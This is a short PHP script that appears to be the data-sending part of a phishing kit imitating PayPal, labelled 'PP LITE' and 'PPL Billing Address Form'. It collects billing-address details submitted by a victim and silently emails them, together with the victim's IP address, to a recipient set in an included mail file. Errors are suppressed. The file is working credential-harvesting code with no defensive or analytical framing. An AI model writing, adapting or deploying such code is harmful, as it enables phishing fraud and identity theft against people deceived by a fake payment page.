<?php

include("functionsend.php");
include("mail.php");
$head = "MIME-Version: 1.0" . "\r\n";
$head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$head .= "From: PP LITE" . "\r\n";
$subject = "PPL Billing Address Form :".getenv("REMOTE_ADDR");
@mail($to,$subject,functionsend::address(),$head);
?>